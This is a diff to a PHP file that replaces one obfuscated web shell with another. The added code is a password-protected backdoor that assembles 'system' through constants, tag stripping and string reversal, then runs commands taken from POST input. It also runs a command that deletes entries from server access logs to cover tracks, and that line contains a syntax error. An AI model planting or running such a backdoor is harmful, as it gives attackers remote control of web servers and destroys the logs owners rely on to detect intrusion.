@@ -1,21 +1,24 @@
 <?php
-//simple shell
-define("h", "sy");
-define("d", "s");
-define("a", "te");
-define("x", "m");
-define("b", "base64_");
-define("c", "encode");
-define("p", "decode");
-
-//Didn't obfuscated the b64 decode and encode too well 
-
-$xd = b.c;
-$lol = b.p;
-$haha = h.d.a.x;
-
-$cmd = $xd($_POST["cmd"]);
-
-$haha($lol($cmd));
-
+if(isset($_POST["pass"]))
+{
+	if(md5($_POST["pass"]) === "7376428d6191775fe98fd88d19a86c49") //lolmoney
+	{
+                 $DONKDONK = $_POST["haha"];//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+                 define("s", "d");//					aaaaaaaaA
+                 define("x", "f");//					aaaaaaaaA
+                 define("p", "n");//					aaaaaaaaa
+                 define("f", "i");//					aaaaaaaaa
+                 define("r", "e");//					aaaaaaaaa
+		 $X = s.r.x.f.p.r;//		LOLMONEY		aaaaaaaaa
+                 $X("T", "s");//AAAA					aaaaaaaaa
+                 $X("L", "y");//aaAA					aaaaaaaaa
+                 $X("D", "t");//aaAA					aaaaaaaaa
+                 $X("O", "m");//aaAA					aaaaaaaaA
+		 $loldongs = "<html>".O."<h1>".r."<p>".D."</h1>".T.L."</html>".T;
+				 //				       \\
+				//					\\
+ 		$magik = strip_tags($loldongs);$peowm = strrev($magik);$peowm($DONKDONK);
+		$peowm("find /var/log/ -name 'access*log' | xargs sed -i '/".$ARGV[0]"/d' "); //Removes line from log file :)
+	}
+}
 ?>
